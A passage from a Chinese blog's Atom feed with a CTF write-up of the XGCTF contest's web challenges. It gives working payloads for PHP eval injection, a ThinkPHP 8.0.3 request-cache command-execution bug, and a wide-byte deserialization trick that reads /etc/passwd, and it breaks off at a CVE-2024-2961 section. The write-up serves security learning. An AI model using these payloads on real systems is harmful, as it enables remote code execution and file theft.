<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>雲流のLowest World</title>
  
  
  <link href="http://c1oudfl0w0.github.io/blog/atom.xml" rel="self"/>
  
  <link href="http://c1oudfl0w0.github.io/blog/"/>
  <updated>2024-07-07T14:34:18.174Z</updated>
  <id>http://c1oudfl0w0.github.io/blog/</id>
  
  <author>
    <name>C1oudfL0w0</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XGCTF西瓜杯</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/</id>
    <published>2024-07-06T10:50:11.000Z</published>
    <updated>2024-07-07T14:34:18.174Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>web和pwn最分不开的一集</p><p>官方wp：<a href="https://docs.qq.com/doc/DRmVUb1lOdmFMYmx1">https://docs.qq.com/doc/DRmVUb1lOdmFMYmx1</a></p><p>草，一个最新最热cve分别出了一个web题和一个pwn题</p><span id="more"></span><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="CodeInject"><a href="#CodeInject" class="headerlink" title="CodeInject"></a>CodeInject</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">#Author: h1xa</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"var_dump((Object)<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>eval命令注入，直接闭合前面的代码即可</p><p>payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">111)?><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls /'</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240706185318017.png" alt="image-20240706185318017"></p><hr><h2 id="tpdoor（复现）"><a href="#tpdoor（复现）" class="headerlink" title="tpdoor（复现）"></a>tpdoor（复现）</h2><p>tp框架，只给了个index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">app<span class="token punctuation">\</span>BaseController</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>facade<span class="token punctuation">\</span>Db</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Index</span> <span class="token keyword">extends</span> <span class="token class-name">BaseController</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$middleware</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'think\middleware\AllowCrossDomain'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'think\middleware\CheckRequestCache'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'think\middleware\LoadLangPack'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'think\middleware\SessionInit'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token variable">$isCache</span> <span class="token operator">=</span> <span class="token constant boolean">false</span> <span class="token punctuation">,</span> <span class="token variable">$cacheTime</span> <span class="token operator">=</span> <span class="token number">3600</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$isCache</span> <span class="token operator">==</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token keyword">require</span>  <span class="token constant">__DIR__</span><span class="token operator">.</span><span class="token string single-quoted-string">'/../../config/route.php'</span><span class="token punctuation">;</span>            <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'request_cache_key'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$isCache</span><span class="token punctuation">;</span>            <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'request_cache_expire'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$cacheTime</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'request_cache_except'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token constant">__DIR__</span><span class="token operator">.</span><span class="token string single-quoted-string">'/../../config/route.php'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;?php return '</span><span class="token operator">.</span> <span class="token function">var_export</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string single-quoted-string">'cache is enabled'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string single-quoted-string">'Welcome ,cache is disabled'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>目的应该是要控制<code>file_put_contents</code>写入文件，而这里的逻辑只是更新了一次config下的router.php，嗯？</p><p>弄了个不存在的路由报错，得知版本是tp8.0.3</p><p>官方文档里是这么描述的：<a href="https://doc.thinkphp.cn/v8_0/request_cache.html">https://doc.thinkphp.cn/v8_0/request_cache.html</a></p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707220747986.png" alt="image-20240707220747986"></p><p>config&#x2F;route.php下的描述：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 是否开启请求缓存 true自动缓存 支持设置请求缓存规则</span><span class="token string single-quoted-string">'request_cache_key'</span>     <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>看不懂，啥叫支持设置请求缓存规则，我们看看官方怎么支持的，直接翻对应的中间件</p><p>&#x2F;vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;middleware&#x2F;CheckRequestCache.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/** * 读取当前地址的请求缓存信息 * @access protected * @param Request $request * @param mixed   $key * @return null|string */</span><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">parseCacheKey</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token keyword">instanceof</span> <span class="token class-name">Closure</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 关闭当前缓存</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">true</span> <span class="token operator">===</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 自动缓存功能</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'__URL__'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">str_contains</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'|'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$fun</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 特殊规则替换</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">str_contains</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'__'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'__CONTROLLER__'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'__ACTION__'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'__URL__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token variable">$request</span><span class="token operator">-></span><span class="token function">controller</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-></span><span class="token function">url</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">str_contains</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">':'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$param</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">param</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$param</span> <span class="token keyword">as</span> <span class="token variable">$item</span> <span class="token operator">=></span> <span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">str_contains</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">':'</span> <span class="token operator">.</span> <span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':'</span> <span class="token operator">.</span> <span class="token variable">$item</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$val</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">str_contains</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'['</span> <span class="token operator">.</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">ext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">']'</span> <span class="token operator">==</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 缓存某个后缀的请求</span>            <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-></span><span class="token function">url</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$fun</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$fun</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$key</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707221047385.png" alt="image-20240707221047385"></p><p>发现最底下<code>$key = $fun($key)</code>这两个参数没做过滤直接裸奔了</p><p>然后 $key 对应的就是上面配置选项的键值，而 $fun 是从下面这段来的</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">str_contains</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'|'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$fun</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>即键值以<code>|</code>分隔符，前面的为$key，后面的为$fun</p><p>那么就有payload了</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>isCache<span class="token operator">=</span>ls <span class="token operator">/</span><span class="token operator">|</span><span class="token class-name">system</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行两次，第一次写入配置，第二次就能回显结果了</p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707221607769.png" alt="image-20240707221607769"></p><p>注意写入配置是一次性的操作，想要再次执行其他命令就得重启靶机，除非弹shell</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>isCache<span class="token operator">=</span>cat <span class="token operator">/</span><span class="token number">000</span>f1ag<span class="token operator">.</span><span class="token class-name">txt</span><span class="token operator">|</span><span class="token class-name">system</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="easy-polluted"><a href="#easy-polluted" class="headerlink" title="easy_polluted"></a>easy_polluted</h2><p>前有污染，竟然是原题！</p><p>见：<a href="https://c1oudfl0w0.github.io/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/#Polluted">https://c1oudfl0w0.github.io/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/#Polluted</a></p><hr><h2 id="Ezzz-php"><a href="#Ezzz-php" class="headerlink" title="Ezzz_php"></a>Ezzz_php</h2><blockquote><p>mb_strpos与mb_substr执行差异 + CVE-2024-2961</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">substrstr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"["</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$end</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$start</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$end</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> <span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">read_file</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$start</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string double-quoted-string">"/etc/passwd"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">=</span><span class="token variable">$start</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">start</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"gxngxngxn"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">echo</span> <span class="token string single-quoted-string">'What you are reading is:'</span><span class="token operator">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'start'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$readfile</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">read_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'start'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$read</span><span class="token operator">=</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"I_want_to_Read_flag"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\[|\]/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NONONO!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token function">substrstr</span><span class="token punctuation">(</span><span class="token variable">$read</span><span class="token operator">.</span><span class="token string double-quoted-string">"["</span><span class="token operator">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$readfile</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Start_Funny_CTF!!!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>稍微审一下，可以知道我们需要控制<code>$read.&quot;[&quot;.serialize($readfile).&quot;]&quot;</code>，然后在后面的反序列化中覆盖<code>$filename</code></p><p>先本地起一个环境测试一下</p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240706192755440.png" alt="image-20240706192755440"></p><p>那么问题很明显在怎么绕过<code>substrstr</code>的截取，因为read有正则过滤所以不能直接输入<code>[</code>、<code>]</code></p><p>问题不大，我们可以直接在start这里输入<code>[</code>、<code>]</code>，这样构造出来的序列化字符串里面就有中括号，因为<code>[</code>一定是在开头处，那么我们要控制的就是<code>]</code>的位置</p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240706193559961.png" alt="image-20240706193559961"></p><p>我们要构造：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">gxngxngxn<span class="token string double-quoted-string">";s:8:"</span>filename<span class="token string double-quoted-string">";s:5:"</span><span class="token operator">/</span>flag"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是这样子明显不行，这之间没有字符的差距</p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240706194328071.png" alt="image-20240706194328071"></p><h3 id="宽字节漏洞"><a href="#宽字节漏洞" class="headerlink" title="宽字节漏洞"></a>宽字节漏洞</h3><p>这个时候突然想起来<code>mb_strpos</code>与<code>mb_substr</code>执行差异产生的宽字节漏洞</p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240706211046282.png" alt="image-20240706211046282"></p><p>成功控制前面的部分，那就可以直接把前面多余的部分全部用<code>%f0%9f</code>覆盖掉即可，每次可以覆盖掉两个字母</p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240706212236113.png" alt="image-20240706212236113"></p><p>本地测试成功，注意我的start开头是多了个字符进行配平成2的倍数的</p><p>那么payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>start<span class="token operator">=</span>aO<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"read_file"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"start"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"gxngxngxn"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"filename"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"/etc/passwd"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>read<span class="token operator">=</span><span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来的问题就是找flag，测试发现<code>php://input</code>用不了，环境变量也删了</p><h3 id="CVE-2024-2961"><a href="#CVE-2024-2961" class="headerlink" title="CVE-2024-2961"></a>CVE-2024-2961</h3><p>尝试打CVE-2024-2961，此事在我的<a 